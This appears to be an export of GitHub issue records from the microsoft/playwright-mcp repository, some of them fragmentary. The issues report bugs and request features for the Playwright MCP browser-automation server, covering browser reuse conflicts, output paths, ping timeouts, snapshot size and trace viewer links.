This is one of a few different issues that have come out of unexpected behaviors or breaking changes to the browser_screenshot tool. The prior one was the change from returning base64 encoded image data, to defaulting to saving images on disk instead.

Going forward would it be possible to version the tool behavior via a cmd line parameter and/or otherwise document breaking changes?"

This is an issue for example on NixOS when having `PLAYWRIGHT_BROWSERS_PATH` set to use the proper playwright patched browsers to run `npx playwright test` tests successfully but wanting to use `/run/current-system/sw/bin/chromium` as the browser.

This becomes issue when wanting to use @playwright/mcp in for example Claude Code in a development environment where `PLAYWRIGHT_BROWSERS_PATH` is exported. A workaround for this is to override that variable to be empty like
```json

microsoft/playwright-mcp,3432054090,1055,Playwright MCP reinstalls browsers despite Docker pre-installation,closed,2025-09-18T21:50:27Z,2025-09-19T21:53:18Z,[],fg-nava,"I'm running into an issue where the Playwright MCP server performs redundant browser installations on every new container deployment even though I've already installed the browsers during the Docker image build. This defeats the purpose of pre-installing browsers in containers and adds a startup delay. 

### Setup

Docker setup installs Playwright MCP and browsers during the build:

```dockerfile
RUN npm install -g @playwright/mcp@latest
RUN npx playwright install --with-deps chromium
RUN npx playwright install --dry-run
```

When I start the MCP server, it should use these pre-installed browsers immediately:

```bash
npx @playwright/mcp@latest --port 8931 --browser=chromium --headless --no-sandbox
```

### Issue

Despite the browsers being installed during the Docker build, the MCP server still triggers a full browser installation on the first run.

Looking at source code, I can see the issue originate in browser detection logic, `browserContextFactory.ts` ~ [LOC 116-119](https://github.com/microsoft/playwright/blob/2a1ccaf587e9ba949c2fe9d84410e0360a44513f/packages/playwright/src/mcp/browser/browserContextFactory.ts#L116-L119). 

The error handling suggests browsers aren't found even when they're system-installed.

There's also the [`core-install`](https://github.com/microsoft/playwright/blob/8a6a4522e83639a6a8327a5d13876c8869e48717/packages/playwright/src/mcp/browser/tools/install.ts#L24) capability in `tools/install.ts` that automatically triggers browser installation, which appears to be determining that browsers aren't available.

Not sure if I'm missing an obvious piece here or but this seems like a bug rather than intended behavior. Right now there's no good workaround other than accepting the redundant installation."

We have been doing PoC with Playwright MCP with GitHub Copilot. And we have been getting this question on data security:

Even though we are having enterprise GitHub Copilot, do you think Playwright MCP can store the data and share it externally?

I can see we are using stdio as transport protocol, does that mean it's going to utilise the installed playwright inside the vs code and use API's or tools from Playwright MCP to navigate and assert?

  - OS: macOS
  - Minimal repro shows createConnection works, but the returned connection doesn’t expose callTool and listTools returns 0 tools.

- Questions:
  1) When will @playwright/mcp expose tool invocation (callTool/listTools) for the browser_* toolset?
  2) Is there a feature flag, capability, or experimental/pre-release version where this is already available?
  3) If yes, which version and how do we enable it (capabilities array, env flag, config)?

Using @playwright/mcp 0.0.35:
- createConnection succeeds

However, currently, it seems the tool `browser_network_requests` (aka ""_List network requests_"" as it appears in Claude Code at a higher level) is only able to gather list of URL network calls made since refresh of the page from what I can gather.

What I would find really useful is if the response of the tool call actually returned additional troubleshooting information on each network call in addition to the URL of the network call, such as the following:

- Response payload (🙏) 
- Request payload
- Request / Response Header information
- Detailed network calls timing information

### The Benefit?

Such a feature can greatly help engineers troubleshoot issues which may originate from backend network data related information, which would need further deep LLM analysis to locate erroneous data in tandem with the LLMs knowledge of the current codebase to help surface root cause of data issues. 

In turn this could help LLMs to form a plan to strategically apply defensive code patches, or even inform the engineer of a data anomaly which is yet to be accounted for in the code, which may need further investigation and form a part of further analysis.

microsoft/playwright-mcp,3402848793,1026,Browser conflict error when installed via Claude's `mcp add` command - need uninstall instructions,closed,2025-09-10T15:04:12Z,2025-09-10T22:40:59Z,[],NasonZ,"### Description
When installing Playwright MCP through Claude Code's built-in command (`claude mcp add playwright npx @playwright/mcp@latest`), subsequent attempts to use the browser navigation tools result in a persistent error about the browser already being in use. The error persists even after attempting manual configuration.

### Environment
- **OS**: Linux (WSL2)
- **Claude Code Version**: Latest (September 2025)
- **Playwright MCP Version**: @latest
- **Installation Method**: `claude mcp add playwright npx @playwright/mcp@latest`

### Steps to Reproduce
1. Install Playwright MCP via Claude Code: `claude mcp add playwright npx @playwright/mcp@latest`
2. Try to navigate to any URL using `browser_navigate` tool
3. Receive error: `Browser is already in use for /root/.cache/ms-playwright/mcp-chrome-0f3a044, use --isolated to run multiple instances of the same browser`
4. Subsequent attempts fail with the same error

### Current Behavior
- Browser instance appears to persist between sessions
- Error message suggests using `--isolated` flag but it's unclear how to add this when installed via Claude's `mcp add` command
- Cleaning cache directory (`rm -rf /root/.cache/ms-playwright/mcp-chrome-*`) doesn't resolve the issue
- Browser cache directory is immediately recreated with the same conflict

### Expected Behavior
- Browser should either reuse existing instance or create isolated sessions
- Clear documentation on how to configure flags when installed via Claude Code

### Attempted Solutions

1. **Manual configuration attempt** - Added to `.claude/mcp_settings.json`:
```json
{
  ""mcpServers"": {
    ""playwright"": {
      ""command"": ""npx"",
      ""args"": [
        ""@playwright/mcp@latest"",
        ""--isolated""
      ]
    }
  }
}
```
However, it's unclear if this overrides the original `mcp add` installation or if both configurations are active.

2. **Process cleanup** - Killed all playwright/chrome processes and cleared cache:
```bash
pkill -f playwright
pkill -f chrome
rm -rf /root/.cache/ms-playwright/mcp-chrome-*
```
This didn't resolve the issue as the cache directory is recreated with the same conflict.

### Questions

1. **How do I properly uninstall** Playwright MCP that was added via `claude mcp add`? There doesn't appear to be a `claude mcp remove` command.

2. **Is manual configuration in `.claude/mcp_settings.json` sufficient** to override the `mcp add` installation, or do both configurations run simultaneously?

3. **What is the recommended approach** for adding the `--isolated` flag when using Claude Code's `mcp add` command?

4. **Can the default behavior be changed** to use isolated mode by default to prevent these conflicts?

### Additional Context

Running processes show multiple MCP server instances:
```
root  34397  npm exec @playwright/mcp@latest
root  34547  node /root/.npm/_npx/9833c18b2d85bc59/node_modules/.bin/mcp-server-playwright
root  34632  npm exec @playwright/mcp@latest  
root  34778  node /root/.npm/_npx/9833c18b2d85bc59/node_modules/.bin/mcp-server-playwright
```

This suggests multiple instances are running but unable to share or properly isolate the browser profile.

### Suggested Improvements

1. Add `claude mcp remove <name>` command for proper uninstallation
2. Document how to pass flags when using `claude mcp add`
3. Consider making `--isolated` the default mode to prevent conflicts
4. Provide clear documentation on the relationship between `mcp add` installations and manual `.claude/mcp_settings.json` configurations
5. Add automatic cleanup of stale browser profiles on startup

  Classic Playwright limitation: when browsers open files like PDFs in blob viewers, they      
  only show blob:http://localhost:xxx/guid URLs in the ""open tabs"" export. Users cannot        
  interact with, save, or download the actual file content through your MCP.

  ## Observed Behavior

  - PDFs opened in Chrome/Edge PDF viewer show as blob: URLs
  - Images, documents opened from URL.createObjectURL() are inaccessible
  - browser_tabs tool shows unhelpful blob URLs instead of actual content
  - No existing MCP tool can save blob content to files
  - Users stuck when automation encounters blob-based file viewers

  ## Root Cause

  Blob URLs are temporary, browser-internal references that require special handling:
  - Standard navigation/download tools can't access blob content
  - Blob URLs can only be fetched from within the same browser context that created them       
  - Content must be retrieved via fetch() in browser and converted to downloadable format      

  ## Impact

  - Automation breaks when encountering PDF viewers or file blobs
  - Users cannot use MCP to save documents shown in blob viewers
  - Gap in MCP tool coverage for common browser file handling scenarios
  - Workarounds require complex manual steps"

microsoft/playwright-mcp,3387741152,1002,LLM confusion about file saving paths in browser_pdf_save and browser_take_screenshot    tools,closed,2025-09-05T14:21:35Z,2025-09-20T17:15:03Z,[],igormf,"**@pavelfeldman, rewrote ISSUE with actual problem, including part solution. let me know if this makes sense.**

## Summary

When starting the MCP server with `--output-dir`, result messages from `browser_pdf_save` and `browser_take_screenshot` include the raw `--output-dir` string rather than the directory path that was actually created. This leads to relative or malformed paths in messages and confuses agents and users.

## Steps to Reproduce

1. Start with a relative output directory:

   ```
   mcp-server --output-dir my-outputs
   ```

2. Run `browser_pdf_save` or `browser_take_screenshot`.

3. Observe the message:

   ```
   Saved page as my-outputs\page-1234.pdf
   ```

   The path is relative.

4. Start with a Windows absolute output directory:

   ```
   mcp-server --output-dir C:\temp
   ```

5. Run the same tool.

6. Observe the message:

   ```
   Saved page as C:temp\page-1234.pdf
   ```

   The drive separator is malformed in the message.

## Actual Behavior

* Messages echo the raw `--output-dir` value when building the displayed path.
* With a relative `--output-dir`, the message is relative.
* On Windows with `C:\...`, the message can lose the backslash after the drive letter.

## Expected Behavior

* Messages should show the real directory that was created and used on disk.
* Paths should be absolute and correctly formatted for the host OS.

## Code Reference

`src/mcp/browser/config.ts`

```ts
export async function outputFile(config: FullConfig, rootPath: string | undefined, name: string): Promise<string> {
  const outputDir = config.outputDir
    ?? (rootPath ? path.join(rootPath, '.playwright-mcp') : undefined)
    ?? path.join(os.tmpdir(), 'playwright-mcp-output', sanitizeForFilePath(new Date().toISOString()));

  await fs.promises.mkdir(outputDir, { recursive: true });
  const fileName = sanitizeForFilePath(name);
  return path.join(outputDir, fileName);   <-------- returns whatever user set in --output-dir, which usually is a relative path
}
```

## Root Cause

The return value from `fs.promises.mkdir` is not used when composing the saved file path shown to users. As a result, the code returns and reports a path built from the raw `config.outputDir` string rather than the canonical path of the directory that was actually created. This causes relative paths to appear in messages and can surface malformed drive formatting on Windows.

## Notes

* Repros were confirmed in cases where `--output-dir` is a relative path and where it is a Windows absolute path (`C:\temp`).
* Pavel mentioned messages already show full paths, which matches the behavior when `--output-dir` is not set. The divergence occurs when `--output-dir` is provided.
* EXTRA IMPROVEMENT: in `tools\screenshots.ts` and `tools\pdf.ts`, in `filename.describe()` make it extra clear to the llm that's a file NAME ONLY (no directories allowed here). I'm pretty sure you can do that without increasing (significantly) the char count"

- Microsoft Edge  
- WebKit  

Add **Electron** as a supported browser option. This would enable users to automate and test Electron applications directly through the MCP interface.

- **Electron Application Testing**: Many desktop applications are built with Electron. Supporting it would make testing and development workflows more seamless.  
- **Unified Testing Interface**: Developers working with both web and Electron applications could use one interface for all their testing needs.  

Electron automation usually requires specifying the path to the Electron application, along with options like main process arguments and environment variables. Supporting these configurations would ensure smooth integration into Playwright MCP.

microsoft/playwright-mcp,3378287718,989,Feature Request: CDP Authentication Headers Support,closed,2025-09-03T04:47:52Z,2025-09-05T23:06:05Z,[],phatpham-katalon,"## Prolem : 
Currently, MCP Playwright supports connecting to existing browser instances via CDP endpoints using the `CdpContextFactory`, but it does not support custom authentication headers required by some browser automation services like AgentCore Browser. 

## Feature Request:
Add support for custom HTTP headers in CDP connections to enable authentication with services that require header-based authentication.  

## More Detail: 

Extend the `CdpContextFactory` to support additional connection parameters:  
  
1. **Configuration Schema Extension**: Add support for CDP headers in the config

   {  
     ""cdpEndpoint"": ""ws://localhost:9222"",  
     ""cdpHeaders"": {

microsoft/playwright-mcp,3375968933,983,[CDP Connection] Support storage‑state configuration when connecting to a browser via a CDP endpoint,closed,2025-09-02T13:06:34Z,2025-09-03T01:55:25Z,[],Ivan97,"## Description
We would like the Playwright MCP to support loading a storage‑state file when it connects to a browser through a CDP endpoint.
At the moment the `--cdp-endpoint` flag works, but there is no way to tell the remote context to initialise from a previously saved storageState (cookies, localStorage, etc.). Adding this capability would make it possible to reuse an authenticated session without having to keep a persistent Chrome profile.

## Desired behaviour

When the MCP transport starts a Playwright process with a CDP connection, it should accept a --storage-state argument (or an equivalent API option) and apply that state to the newly created browser context.

Illustrative Kotlin configuration using LangChain4j (the pattern we would like to be supported):

```kotlin
val transport = StdioMcpTransport.Builder()
    .command(
        listOf(
            ""npx"",
            ""@playwright/mcp@latest"",
            ""--isolated"",                                   // start a fresh, isolated context
            ""--storage-state=/home/ubuntu/workspace/state.json"", // <-- new flag
            ""--cdp-endpoint=http://xx.xx.xx.xx:9222""        // connect to remote Chrome
        )
    )
    .logEvents(true)
    .build()
```

With the flag above we expect the following sequence internally:

1. `playwright.chromium.connectOverCDP('http://xx.xx.xx.xx:9222')` is invoked.
2. A new browser context is created with storageState loaded from the JSON file located at /home/ubuntu/workspace/state.json.
3. All subsequent pages opened inside that context inherit the cookies/localStorage stored in the file, so the session is already logged‑in.

## Expected CLI signature

```
npx @playwright/mcp@latest \
    --isolated \
    --cdp-endpoint=<url> \
    --storage-state=<path-to-json>
```

- `--storage-state` should accept a path to a JSON file produced by `context.storageState({ path: ... })`.
- If the file does not exist or is malformed, the CLI should emit a clear error and abort the launch.
- The flag should work in all language bindings (JS/TS, Python, .NET, Java) that rely on the MCP transport."
microsoft/playwright-mcp,3375882431,982,Suggestion: Make MCP ping timeout configurable,closed,2025-09-02T12:44:46Z,2025-09-05T23:05:45Z,[],peter-kismarczi,"Dear Authors / Maintainers,

### Problem Description
When our agent performs time-intensive operations (such as web scraping, form filling, waiting for page loads, or processing large datasets), it may fail to respond to MCP ping requests within the hardcoded 5-second timeout in the Playwright MCP server (server.ts, line 117). The server interprets this as a dead connection and terminates the session, resulting in the loss of all browser context.

This issue is further complicated by inconsistent client behavior. While Claude Code respects connection timeout parameters sent by the Playwright MCP server and maintains the connection through regular heartbeats, other MCP client implementations — particularly those using the Go MCP library — do not respect these timeout parameters. Attempting to work around this limitation by sending manual 'keep alive' ping requests introduces additional problems as it breaks the sequence ordering of requests in the MCP protocol.

### Verification Scenarios
To demonstrate the problem and validate the solution, we present three scenarios:
**Scenario 1**: Current implementation failure - [Ark agent error video](https://youtu.be/Agn36aRqLmA?si=--aOV_x7FxdfYFGr)
We build the playwright-mcp image with the default 5-second timeout, run it locally with HTTP transport mode, and start a MITM reverse proxy to track the traffic. When assigning a long-running task to a custom agent using the Go MCP library, the agent encounters an error after approximately 10 seconds. The trace reveals that for the same mcp-session-id, a 404 response is received, indicating the server has terminated the connection due to the ping timeout being exceeded.

**Scenario 2:** Modified timeout success - [Ark agent success video](https://youtu.be/_KuHFo4YFXc?si=73QrhqMFO1GZZQCM)
We modify the hardcoded timeout value in the startHeartbeat function (server.ts, line 117) from 5000ms to a higher value (e.g., 30000ms), rebuild the image, and run the same test setup with MITM proxy monitoring. When assigning the same long-running task to the agent, it successfully completes without encountering the 404 error, as the extended timeout accommodates the time-intensive operation.

**Scenario 3**: Claude Code compatibility - [Claude video](https://youtu.be/NM6j__-Uc4M?si=-INHZN6zwrrR1I5Q)
Running the playwright-mcp locally with MITM proxy monitoring, we add it as an MCP server to Claude Code. When assigning the same time-intensive task to Claude, it successfully completes the operation. The trace shows that the session remains active throughout, as Claude Code respects the server's timeout parameters and regularly sends heartbeats to maintain the connection, preventing premature termination.

### Proposed Solution
We request that the 5-second ping timeout be made configurable through an environment variable (e.g., MCP_PING_TIMEOUT), allowing both Claude Code and other MCP client implementations to properly handle long-running browser automation tasks without premature connection termination. This change would maintain backward compatibility with the default 5-second timeout while providing flexibility for scenarios requiring extended operation times."
microsoft/playwright-mcp,3375480416,981,Unstable Element Locators Generated by Playwright MCP - Request for Improved Selector Strategy,closed,2025-09-02T10:45:24Z,2025-09-20T17:15:40Z,[],Mr-jing,"  I'm using Claude Code with Playwright MCP for UI automation to generate reusable Playwright code scripts.

  During the process, Playwright MCP returns an ""accessibility tree"" to the AI, which contains limited information. The AI only provides parameters (such as `element：""Company drop-down arrow""，ref：""e322""`) to Playwright tools
  (like `Click`), and it's the Playwright MCP that generates the JavaScript code with its own selector choices.

  This creates some issues, for example:
  It selects dynamic data values as locators: 
```javascript
await page.getByTitle('CWB Company').locator('i').click();
```
  If the dropdown option is currently not 'CWB Company', this code will fail to execute.

  Question:
  Is there any way to optimize or resolve this issue?

  Expected Behavior:
  I expect Playwright to choose more stable locators, so that the generated Playwright scripts don't require manual adjustments.

  Constraint:
  I cannot modify the page itself, such as adding `data-testid` attributes."

The second MCP Server (DuckDucckGo) is just an example. Breaks with others as well (e.g., a locally hosted one using FastMCP)

Everything was fine until version 0.0.32, but any version newer than that breaks. From my initial research I assume that it is caused by the updated page session management Playwright MCP in version 0.0.33 or newer. 

Interestingly, everything is fine when I remove the second MCP server and only use Playwright. So I guess the error is a combination of FastMCP + the recent update in Playwright. 
So it might be caused by how FastMCP handles multiple MCP server and the routing between them. 

Any help is appreciated. "
microsoft/playwright-mcp,3350468517,945,Suggestion - Add Built-in Snapshot Preprocessing Tool to Filter Unnecessary generic Nodes,closed,2025-08-25T05:29:05Z,2025-09-05T23:02:06Z,[],PraneshxxTechy,"Hello Contributors,

I have been working with the Playwright MCP server for web testing, and it has been a wonderful tool to use — it excels in most cases. However, one issue I started facing is that the response of each tool can be quite long, which consumes a large amount of LLM tokens. One snapshot nearly 25K tokens resulting in the termination of the test while processing.

In particular, the current browser_snapshot tool returns the full accessibility tree, which often contains many generic nodes (from <div>/<span> wrappers). While this preserves structure, it leads to large snapshots that increase token usage and reduce clarity for LLMs.

I’d like to propose adding a new tool (e.g., browser_snapshot_preprocessed) that automatically filters out unnecessary generic nodes while preserving meaningful content. For example, it would keep generic nodes only if they contain visible text or have interactive properties (like cursor=pointer).

This would make snapshots smaller, cleaner, and more efficient for LLM-driven automation, while still retaining all actionable elements like buttons, links, inputs, and important text.

Thank You!"

- **Host OS:** Ubuntu 24.04.3 LTS (noble)
- **Virtualization:** LXC container on Proxmox VE (kernel 6.14.8-2-pve)
- **Architecture:** x86_64
- **User:** root
- **Connection:** VSCode on Windows connecting via SSH Remote extension
- **Project:** Single project workspace (`/home/NovoRCO`)
- **MCP:** Local MCP server accessed via SSH connection

**Tool Information:**
- **Tool:** playwright-mcp
- **Command:** `browser_navigate_playwright-mcp`
- **Target URL:** https://www.google.com

**Error Message:**
```
### Result
Error: Browser is already in use for /root/.cache/ms-playwright/mcp-chrome, use --isolated to run multiple instances of the same browser
```

**Critical Issue:**
**We have NEVER been able to use playwright-mcp successfully. The error occurs on the very first attempt to use the tool, immediately after starting the LXC container and connecting via SSH.**

**Steps to Reproduce:**
1. Start fresh LXC container
2. Connect via VSCode SSH Remote extension
3. Attempt to use `browser_navigate_playwright-mcp` for the **first time**
4. Error occurs immediately - no previous browser instances exist

**Current Behavior:**
- **First attempt always fails** with ""Browser already in use"" error
- No previous browser sessions or instances
- `browser_close_playwright-mcp` returns ""No open tabs"" (because nothing was ever opened)
- Tool appears to be completely unusable in this environment

**Expected Behavior:**
- First attempt should work normally
- Should be able to navigate to any URL on fresh container start

**Additional Context:**
- **Never worked:** This is not a cleanup issue - the tool has never functioned
- **Fresh environment:** Error occurs even on completely clean container startup
- **No competing processes:** No other browser instances running
- **Container-specific:** May be related to LXC container environment preventing proper browser initialization

**Potential Root Causes:**
- Browser initialization failing in LXC container environment
- Incorrect detection of existing browser instances
- Permission issues in containerized environment
- Browser sandbox incompatibility with LXC

**System Information:**
```bash
# Virtualization detection

  Playwright MCP server launches a new Chrome instance instead
  of connecting to an existing Chrome instance with remote
  debugging enabled when configured with --extension.

  Environment

  - OS: macOS Darwin 25.0.0
  - Chrome Version: 139.0.7258.139
  - Playwright MCP: @playwright/mcp@latest
  - Claude Code: v1.0.85
  - Chrome DevTools Protocol: 1.3

Configured as:
```
  ""playwright-mcp"": {
          ""type"": ""stdio"",
          ""command"": ""npx"",
          ""args"": [""@playwright/mcp@latest"", ""--extension""],
          ""env"": {}
        }
```

  Expected Behavior

  When configured with:
  `--extension flag`: Should connect to existing Chrome
  instance via the Playwright MCP Bridge extension


  Actual Behavior

  Playwright MCP launches a new Chrome instance.

  Steps to Reproduce

  1. Start Chrome with remote debugging:
  /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
   --remote-debugging-port=9222
  --user-data-dir=.chrome-debug-profile

**EDIT: install playwright MCP [browser extension](https://github.com/microsoft/playwright-mcp/blob/main/extension/README.md)**

  2. Verify Chrome is accessible:
  curl http://localhost:9222/json/version
  claude mcp add playwright-mcp ""npx @playwright/mcp@latest
  --extension""
  4. Use any Playwright MCP tool (e.g., browser_snapshot)
  5. Observe: New Chrome instance launches instead of connecting
   to existing one

  Additional Information

  - Extension shows ""MCP client connected"" but still launches
  separate browser
  - No error messages indicating connection failure to existing
  instance

  Impact

  Unable to use Playwright MCP with existing authenticated
  browser sessions or debug existing browser state. This
  prevents workflows that require:
  - Testing with logged-in sessions
  - Debugging existing page states
  - Sharing browser context between multiple tools"

* `@playwright/mcp` depends on:
   ```
   ""playwright"": ""1.55.0-alpha-2025-08-07"",
   ""playwright-core"": ""1.55.0-alpha-2025-08-07"",
   ```
   (or some other locked alpha version)
* `@playwright/test` locks to whatever version is specified so `""playwright"": ""1.54.2""` in my case `^1.54.2` is what we use for `@playwright/test`
* `@playwright/browser-chromium` which is brought in **via another package** and resolves to using `""playwright-core"": ""1.54.2""`

I'm trying to reuse a lot of the automation code we have that leverages `@playwright/test` in a `@playwright/mcp` connection.

**and when they are the same**, I get functionality differences when I pass in a context created from 1.54 of `playwright` and pass it in to `@playwright/mcp` which expects 1.55-alpha where I get:
```
### Result
Error: Ref not found, likely because element was removed. Use browser_snapshot to see what elements are currently on the page.
```

for any ""run type text"" tool calls but once I update to have our `@playwright-core` version.

I need a stable dependency tree so that we can really take advantage of `@playwright/mcp` and depending on all alphas (and forcing packages to use those alphas) is a recipe for failures.

1. forcing my dependencies to use a specific version of their dependency is going to be fragile
2. ""alpha"" for a prod release isn't a great practice "

The browser snapshot currently seems to be giving the entire page. However, most of the times, the page contains many elements that are either hidden or not interactable (for example if there is a dialog, everything behind it is non-interactable) In these cases, if the browser snapshot tool can ignore these elements refs and deal only with the interactable set of elements, it will reduce a lot of token count. We are seeing that , in our application the LLM token limit is reached just within 5-10 steps of automation. 

Can you please consider this?
 
Thanks,
Vijay"

microsoft/playwright-mcp,3326559216,906,MCP server hits rate limit when running Playwright tests via MCPSsePlugin,closed,2025-08-15T23:11:10Z,2025-08-16T15:16:09Z,[],mohananup,"Description:
  When running Playwright tests through the MCP server (via MCPSsePlugin in Semantic Kernel / Azure AI Agent), I consistently hit a rate limit error.
  This happens even when sending relatively few tests, and appears to be related to how the MCP server handles concurrent requests or SSE connections.

Environment:

- MCP server: Playwright MCP server
- Client: Semantic Kernel (Azure AI Agent SDK)
- Platform: AI Foundry
- Open AI model : gpt4.1
- Plugin: MCPSsePlugin with url=http://<server-ip>:<port>/sse
- Playwright version: @latest
- OS - Ubuntu in WSL

Expected behavior:

- MCP server should accept queued Playwright test runs or return results without hitting a rate limit.

Actual behavior:

- MCP server responds with a rate limit error after a small number of sequential test requests.
- Appears to trigger regardless of the size of the tests.
- Retrying after a cooldown works, but disrupts the automated agent workflow.

Error:
`RunStatus.FAILED` for agent `PLAYWRIGHT_MCP_AGENT` and thread `thread_VZO8LTvlREd0WOWVObfZJP0O` with error: Rate limit is exceeded. Try again in 48 seconds.

My assessment is that the proposed solution is to run multiple mcp servers but I don't see how I can do that from a ""typical"" application like claude code. 
Here's my mcp config for playwright+CC
```json
{
  ""mcpServers"": {
    ""playwright"": {
      ""command"": ""npx"",
      ""args"": [
        ""-y"",
        ""@playwright/mcp@latest"",
        ""--isolated"",
        ""--output-dir"", ""~/test/screenshots""
      ]
    }
  }
}
```
I've noticed that when I have claude spin up multiple agents to use playwright to do web things, they often come back with very different results if they are launched in parallel vs sequentially.  Since I'm not running in headless, I can see them all fighting over the same tab in the same browser window.  If I have the agents launch their own tabs the parallel results are more consistent with the serial results but they're not quite there.

I imagine the issues would be fixed if the different mcp tools also took a tab index as a parameter (with the caveat that I don't know anything about browsers).

Is there a way to do safe, parallel execution when one only has access to a single mcp server that the application fires up on start up?  Have I misunderstood something?"

microsoft/playwright-mcp,3315009840,872,browser_navigate hangs indefinitely - no browser window launches,closed,2025-08-12T16:23:14Z,2025-08-12T19:51:03Z,[],ajmallesh,"## Description
The Playwright MCP server hangs indefinitely when calling `browser_navigate`. The MCP connection establishes successfully, but the browser never launches and the call never returns.

## Reproduction Steps
1. Install `@playwright/mcp@0.0.33` and `@modelcontextprotocol/sdk`
2. Run the minimal test script below
3. Observe that it hangs at the `browser_navigate` call

## Minimal Reproduction Script
```javascript
#!/usr/bin/env node
const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
const { StdioClientTransport } = require('@modelcontextprotocol/sdk/client/stdio.js');

async function main() {
  console.log('Starting Playwright MCP test...\n');
  
  let client;
  
  try {
    // Create transport and client
    const transport = new StdioClientTransport({
      command: 'npx',
      args: ['@playwright/mcp@latest', '--isolated']
    });
    
    client = new Client(
      { name: 'test-client', version: '1.0.0' },
      { capabilities: {} }
    );
    
    // Connect
    console.log('[1] Connecting...');
    await client.connect(transport);
    console.log('[1] ✓ Connected\n');
    
    // Navigate
    console.log('[2] Navigating to example.com...');
    await client.callTool('browser_navigate', {
      url: 'https://example.com/'
    });
    console.log('[2] ✓ Navigation successful\n');
    
    // Wait 2 seconds
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Close browser
    console.log('[3] Closing browser...');
    await client.callTool('browser_close', {});
    console.log('[3] ✓ Browser closed\n');
    
    // Disconnect
    await client.close();
    console.log('✓ Test completed successfully\n');
    process.exit(0);
    
  } catch (error) {
    console.error('\n❌ Error:', error.message);
    
    if (client) {
      try {
        await client.close();
      } catch (e) {}
    }
    
    process.exit(1);
  }
}

main().catch(error => {
  console.error('Fatal error:', error.message);
  process.exit(1);
});
```

## Actual Behavior
```Bash
node minimal-playwright-mcp-test.js
Starting Playwright MCP test...

[1] Connecting...
[1] ✓ Connected

[2] Navigating to example.com...
^C
```

The script hangs indefinitely at browser_navigate and must be killed manually.
## Expected Behavior

- Browser window should launch
- Navigation should complete
- Script should continue execution

## Environment

- Node.js: v22.14.0
- OS: macOS Sequoia 15.5
- @playwright/mcp: 0.0.33
- @modelcontextprotocol/sdk: latest: 1.17.2

## Additional Context

- Running with --isolated flag to avoid profile persistence issues
- No error messages are produced, the call simply never returns
- The MCP server connection works correctly (can list tools, etc.)
- No browser process appears in Activity Monitor/Task Manager"
microsoft/playwright-mcp,3313230125,869,Trace viewer link from Playwright SSE shows `trace=undefined/trace.json` and does not load traces,closed,2025-08-12T08:54:36Z,2025-08-12T20:41:09Z,[],mohananup,"
### Description
When running Playwright SSE via `@playwright/mcp` with `--save-trace`, the MCP server prints a trace viewer URL that contains `trace=undefined/trace.json`. Opening that URL does not load any trace. If I manually change the `trace=` query to point to the actual trace path (the generated `trace.trace` renamed to `trace.json`), the viewer loads correctly.

this issue started today and before that it was working fine. I also noticed that initially `traces` folder was created but now `traces-<timestamp>` is being created. 

### Command used
```bash
npx @playwright/mcp@latest \
  --save-trace \
  --port 8931 \
  --output-dir mcp_results \
  --headless \
  --isolated \
  --viewport-size ""1280, 720"" \
  --save-session
````

### Where traces are written

```
<path to>/traces-1754984203434/
  trace.network
  trace.trace     
  resources/
```

### Broken URL (from MCP server output)

```
http://localhost:44239/trace/index.html?trace=undefined/trace.json
```

Opening this shows the trace UI but no data (it cannot locate the file).

### Working URL (manual fix)

If I point `trace=` to the actual path, the trace loads:

```
http://localhost:44239/trace/index.html?trace=<path to>/traces-1754984203434/trace.json
```


### Steps to reproduce

1. Run the MCP command above (or any run that generates a trace).
2. After the run, click the trace viewer URL printed by the MCP server.
3. Observe the query param is `trace=undefined/trace.json` and the viewer does not load the trace.
4. Update the URL to:

   ```
   http://localhost:<PORT>/trace/index.html?trace=<path to>/trace.json
   ```
5. The trace loads correctly.

### Expected behavior

* The link printed by `@playwright/mcp` should include a valid `trace=` query pointing to the generated trace.

### Actual behavior

* The MCP server prints a URL with `trace=undefined/trace.json`. Opening it yields an empty viewer.

### Environment

* @playwright/mcp version: latest 
* OS: Windows[WSL]
* Browser(s): chromium
* Workspace: DevContainer



### Workaround

Manually replace the `trace` query string to point to the generated trace path:

```
http://localhost:<PORT>/trace/index.html?trace=<path to>/traces-<timestamp>/trace.json
```

This setting would be great for prompts like:

```
Navigate to <url here>
Take a high quality screenshot of the viewport.
```

I could see this working well in mcp config like `--max-image-quality=100`, or `--max-image-quality=80` as well to set the upper bound for the entire process. 

I think a default setting of `90` as the upper bound is totally valid, but perhaps allowing the developer to set the quality to `100` would be even better.

microsoft/playwright-mcp,3303208147,853,Issue: Enhance image element handling by returning Base64 image data for model recognition,closed,2025-08-08T08:51:02Z,2025-08-25T15:46:10Z,[],chenke95516,"Description:
Playwright MCP currently struggles with identifying image-based elements (e.g., icon menus represented by three horizontal lines) because it relies solely on accessibility tree data (structured semantic attributes like aria-label or alt text). For images without these attributes, MCP cannot provide meaningful descriptions to the model, making it impossible to target them via tools like browser_click.

However, MCP already has a browser_take_screenshot tool that can capture element-specific screenshots and return Base64-encoded image data (as seen in src/tools/screenshot.ts, where images are added to responses with response.addImage({ contentType, data })). This capability is underutilized for element identification.

Proposal:
Extend MCP's snapshot or element metadata to include Base64 image data for image elements (e.g., <img>, <svg>, or elements with background-image). This would allow the model to visually recognize elements (even without semantic attributes) and decide whether to interact with them, complementing the existing accessibility tree-based approach.

Benefits:

Enables models to handle ""visual-only"" elements (e.g., icon buttons, logos) that lack semantic attributes.
Leverages MCP's existing screenshot infrastructure (Base64 encoding, image attachment in responses) instead of building new tools.
Maintains compatibility with structured data approaches while adding visual context as an option.

Implementation Considerations:

Add a flag (e.g., includeImageData) to browser_snapshot or a new tool to trigger image data collection for elements.
Limit image data to elements that are images (via DOM inspection) to avoid performance overhead.
Attach element-specific Base64 images to snapshot responses, similar to how browser_take_screenshot attaches full/element screenshots.

Example Use Case:
A three-line menu icon without alt text would have its Base64 image included in the snapshot. The model could recognize it as a menu and use browser_mouse_click_xy (with coordinates derived from the image) to interact with it.

Would this be feasible to implement, and are there existing tools/APIs in MCP that could be extended to support this?"
microsoft/playwright-mcp,3303189971,852,Issue: absolute inset-0 elements block MCP clicks while native XPath clicks work,closed,2025-08-08T08:44:42Z,2025-08-25T15:52:10Z,[],chenke95516,"Description:
When interacting with elements covered by a layer with position: absolute; inset: 0, Playwright MCP's browser_click tool fails with a timeout error (TimeoutError: locator.click: Timeout 5000ms exceeded), indicating the click is intercepted by the overlay. However, using Playwright's native page.locator('xpath').click() (with or without force: true) works correctly and can interact with the target element despite the overlay.

Details:

